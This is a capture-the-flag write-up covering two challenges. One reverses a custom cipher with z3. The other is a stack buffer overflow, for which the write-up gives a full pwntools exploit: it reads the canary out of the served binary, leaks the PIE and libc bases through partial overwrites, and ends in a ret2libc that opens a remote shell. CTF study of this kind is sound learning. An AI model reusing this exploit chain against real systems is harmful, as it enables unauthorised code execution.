## Decrypt Message 1
We are given a cpp file and a string to decrypt.
the string to decrypt: 188d1f2f13cd5b601bd6047f4496ff74496ff74496ff7

```cpp
unsigned long* _encryption(void* data, unsigned long size)
{
    unsigned long* data_chunk = NULL;
    unsigned long* result;
    int i;

    if (size & 1) size++; // make sure its even
    data_chunk = (unsigned long*)malloc(size * sizeof(unsigned long));
    if (!data_chunk) return NULL;
    memset(data_chunk, 0, size * sizeof(unsigned long)); // Ensure memory is initialized to zero

    for (i = 0; i < size / 2; i++) data_chunk[i] = ((unsigned short*)data)[i];
    // data stored in the form of 2 bytes in each 8 bytes

    result = encryption(data_chunk, size / 2); // Adjusted the size passed to encryption
    return result;
}
```

This is the wrapper function called before encryption is called.  
It parses the data in the form of 2 chars in one 8byte chunk.

So if I were to encrypt "1234", it will be parsed in memory as:
``` 0x5555555592a0: 0x0000000000003231      0x0000000000003433 ```

this is then passed into the main encryption function:

```cpp
unsigned long* encryption(unsigned long data[], unsigned long size)
{                                                                                                                                           
    unsigned int eax;                                                 
    unsigned int edx;
    unsigned int ecx;                                                                                                                       
    unsigned int byte_address;

    for (byte_address = 0; byte_address < size; byte_address++)
    {                           
        eax = data[byte_address];

        ecx = eax + 0x11;                                             
        eax = eax + 0xB;                                              
        ecx = eax * ecx;  // ecx = (eax+0x11) * (eax+0xb)

        edx = ecx;              
        edx = edx >> 8; // edx = ((eax+0x11) * (eax+0xb)) >> 8                                                                              

        eax = edx;                                                    
        eax = eax ^ ecx;
        eax = eax >> 0x10;                                            
        eax = eax ^ edx;                                              
        eax = eax ^ ecx; // eax = ((edx ^ ecx) >> 0x10) ^ edx ^ ecx               

        data[byte_address] = eax;
    }            
    return data;
}
```

What the function essentially does, is go through every long in data, and encrypt it in the form of
```
eax = long

ecx = (eax+0x10)*(eax+0xb)
edx = ecx >> 8
eax = ((edx ^ ecx) >> 0x10) ^ edx ^ ecx

*data = eax  
```

So to decrypt this, what we have to do is to find a short/int, that after going through this process, will give us the bytes in "188d1f2f13cd5b601bd6047f4496ff74496ff74496ff7"  
The encryption is done on 2 bytes at a time, so you have to break the ciphertext into different parts and decrypt it that way.

To decrypt the encryption, I used z3

```python
from z3 import *

x = BitVec("x",32) # eax
y = BitVec("y",32)
z = BitVec("z",32)

y = (x+0x11) * (x+0xb) # ecx
z = y >> 8 # edx


solve(BV2Int(x)<0xffff,(( ((z^y) >> 0x10) ^ z) ^ y) == 0x4496ff7) # BV2Int(x)<0xffff since its just 2 bytes
print(hex(int(input())))

# 188d1f2f 0x4f47
# 13cd5b60 0x4744
# 1bd6047f 0x5450
# 4496ff7  0x2121
# 4496ff7  0x2121
# 4496ff7  0x2121

# 0x474f44475054212121212121

# >>> from Crypto.Util.number import long_to_bytes
# >>> long_to_bytes(0x474f44475054212121212121)
# b'GODGPT!!!!!!'
```

what's slightly tricky about this is breaking up the ciphertext  
what I realised when playing around the binary, is that sometimes the encryption produces 32 bits ciphertext, but sometimes it only produces 28 bits ciphertext.
So for example, "12" encrypts to "9d57e06", and "ab" encrypts to "25fcd0c8"

So I just had to try breaking the ciphertext sometimes into 32 bits, and sometimes into 28 bits.
We then get the hexstring 0x474f44475054212121212121, and its decrypted into "GODGPT!!!!!!"



## Intelitigation
checksec:
```
[*] '/home/vagrant/ctf/hacktheon24/intelitigation/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

This challenge required us to get the binary through the remote service, which seemed pretty weird.   
I was a bit scared that the binary given each time was different, so I installed the binary a few times and diff'ed it to see if there was anything different.

To get binary:
```python
from pwn import *
from base64 import b64decode
io = remote("hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com",5001)
io.recvline()
io.recvline()

b64_binary = io.recvline()[:-1]
binary = b64decode(b64_binary)

with open("chall","wb") as chall_file:
    chall_file.write(binary)
```

there were slight differences in the binary, a few bytes.  
at first I thought it was PIE or some addressing stuff, but that didn't make sense since PIE works by: same binary, but diff address each time.  
I just dismissed it first and went on to take a look at the binary first

```C
void main(){
  vuln();
  return;
}

void vuln(void){
  // some other vars definition are redacted
  undefined8 local_218;
  undefined8 local_210;
  undefined8 local_208 [63];

  bVar3 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("input> ");
  local_218 = 0;
  local_210 = 0;

  // whats the point of this?
  // to make recalling the function troublesome?
  lVar1 = 0x3e;
  puVar2 = local_208;
  while (lVar1 != 0) {
    lVar1--1;
    *puVar2 = 0;
    puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
  }

  read(0,&local_218,0x300);
  printf("Your input> ");
  printf("%s",&local_218);

  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

there's an obvious buffer overflow, reading 0x300 bytes into a (63-0x10) large buffer   
the input we put in is also repeated, and the function used to receive input is read(), which doesn't append null byte to the end. (which is rly convenient for pwning the binary)  

but that's it. there's some byte manipulation stuff in the middle of the source but that doesn't seem to do much.  

how are you going to bypass the stack canary and leak pie etc with this?  

I was playing around the binary in gdb and I suddenly realised that the different bytes between binaries  might be the stack canary. I ran the binary multiple times in gdb, and the stack canary was the same everytime! That means that we can get the stack canary by analysing the binary outputted on remote.

So now, we can overwrite pass the canary and overwrite the ret address, but we have no leaks, so what do we do?  

Well we can do partial overwrites, and abuse the fact that our input is passed back to us.  
Since read doesn't append null byte, this means that we can leak the pie with this as well, and the partial overwrite will be rly simple since no b"\x0a" is appended to the end.

We can overwrite the LSB of ret and return back to vuln. However there's a printf movaps issue when we return there. To solve this we can return to the "call vuln" instruction instead, since  that will push an address onto the stack and align the stack for movaps.  

After this, we can buffer overflow again and return to printf_plt to leak libc, since when we ret, the rdi is set to a libc address.  
```$rdi   : 0x00007fffffffbe50  →  0x0000155555340050  →  <funlockfile+0> endbr64```

We have to leak the libc on remote first, and get the libc that the server is using.  
Once we leak and address, we put it into libc.rip.
> after the exploit is fully developed, I tested out the libcs shown in libc.rip to find the correct one, which was libc6_2.36-9+deb12u4_amd64.so

Then its just a ret2libc to get shell.

```python
from pwn import *
from base64 import b64decode

if sys.argv[1] == "local":
    io = process("./chall",aslr=True)
    libc = ELF("./libc6_2.36-0ubuntu2_amd64.so")
    canary = 0x5199991bd1359f1f

elif sys.argv[1] == "remote":
    io = remote("hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com",5001)
    libc = ELF("./libc6_2.36-9+deb12u4_amd64.so")
    io.recvline()
    io.recvline()

    b64_binary = io.recvline()[:-1]
    binary = b64decode(b64_binary)
    canary = u64(binary[12336:12344])

rop = ROP(libc)
log.info("CANARY: " + hex(canary))

# leak PIE and restart the binary
io.sendafter(b"input>",b"A"*0x208 + p64(canary) + b"A"*8 + b"\xf2")
io.recvuntil(p64(canary))
io.recvuntil(b"AAAAAAAA")
pieBase = u64(io.recv(6).ljust(8,b"\x00")) - 0x3f2
log.info("PIE BASE: " + hex(pieBase))

# leak libc and restart binary
printfPlt = p64(pieBase+0xc0)
vuln = p64(pieBase+0x324)
ret = p64(pieBase+0x3fd)

exploit = b"A"*0x208 + p64(canary) + b"B"+b"\x00"*7 + ret + printfPlt + ret + vuln
io.sendafter(b"input>",exploit)

io.recvuntil(b"B")
libc.address = u64(io.recv(6).ljust(8,b"\x00")) - libc.symbols["funlockfile"]
log.info("LIBC BASE: " + hex(libc.address))

# ret2libc
popRdi = p64(libc.address + rop.rdi[0])
ret2libc = b"A"*0x208 + p64(canary) + b"\x00"*8 + ret + popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
#gdb.attach(io,gdbscript="break *" + hex(pieBase+0x3e4))
io.sendafter(b"input>",ret2libc)

io.interactive()
```
